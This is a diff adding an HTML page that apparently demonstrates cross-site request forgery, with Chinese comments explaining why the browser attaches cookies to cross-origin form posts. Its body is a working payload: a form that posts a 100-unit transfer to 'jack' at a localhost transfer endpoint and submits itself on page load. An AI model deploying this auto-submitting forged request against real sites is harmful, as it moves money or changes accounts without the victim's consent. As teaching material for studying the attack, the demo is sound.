@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <!-- form请求没有跨域 -->
+    <!-- 第三方网站，其实拿不到用户的cookie，当往3000端口提交内容时自动带上cookie的内容 -->
+    <form name="myform" action="http://localhost:3000/api/transfer", method="post">
+        <input type="text" name="target" value="jack">
+        <input type="text" name="money" value="100">
+    
+    </form>
+</body>
+<script>
+    document.myform.submit()
+</script>
+</html>
